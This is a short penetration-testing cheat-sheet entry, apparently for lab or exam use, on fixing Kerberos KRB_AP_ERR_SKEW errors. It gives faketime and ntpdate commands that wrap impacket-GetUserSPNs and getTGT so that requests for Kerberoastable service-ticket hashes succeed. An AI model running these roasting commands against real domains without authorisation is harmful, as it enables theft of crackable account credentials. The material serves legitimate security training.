title: Kerberos Clock Skew (KRB_AP_ERR_SKEW)
body:
Kerberos rejects any request whose timestamp is more than 5 minutes off the KDC's clock — this is anti-replay, not a misconfiguration you can talk your way past. Lab DCs are frequently years out of sync with your Kali host. The tell is KRB_AP_ERR_SKEW(Clock skew too great), and it bites GetUserSPNs -request, getTGT, GetNPUsers -request, and any -k -no-pass auth.

The trap: SPN enumeration runs over LDAP using your password, so it succeeds and prints a clean table of roastable accounts. Only the ticket request speaks Kerberos. You get a healthy-looking SPN list, no hashes, and no outputfile — easy to misread as 'no hashes available' when it is purely a clock problem. Always confirm the outputfile actually exists before moving on.
cmd:
# --- Check the drift first (changes nothing) -----------
ntpdate -q <DC_IP>

# --- Option 1: per-process, no system clock change (preferred) ---
faketime "$(ntpdate -q <DC_IP> | awk '{print $1" "$2}')" \
  impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP> -request -outputfile tgs.txt

# Works for any Kerberos tool — wrap the whole command:
faketime "$(ntpdate -q <DC_IP> | awk '{print $1" "$2}')" \
  impacket-getTGT '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP>

# --- Option 2: sync the host clock to the DC ------------
sudo timedatectl set-ntp 0        # MUST be first — timesyncd re-syncs within seconds otherwise
sudo ntpdate -u <DC_IP>
timedatectl status                # confirm it took

# ... run your Kerberos tooling ...

sudo timedatectl set-ntp 1        # restore when done

# --- If ntpdate is not installed ------------------------
sudo apt install ntpdate -y
# or pull the time from the DC over SMB:
nxc smb <DC_IP> | grep -i time
sudo rdate -n <DC_IP>

# --- Verify the fix worked ------------------------------
ls -l tgs.txt                     # no file = it still failed
grep -c 'krb5tgs' tgs.txt
warn: Run 'sudo timedatectl set-ntp 0' BEFORE ntpdate — otherwise systemd-timesyncd drags the clock back to real time within seconds and you will think the fix did not work. Restore with 'set-ntp 1' when finished: a desynced clock breaks TLS certificate validation, so apt, pip, and web browsing start throwing confusing cert-expiry errors. faketime avoids this entirely and is the safer default on an exam clock.
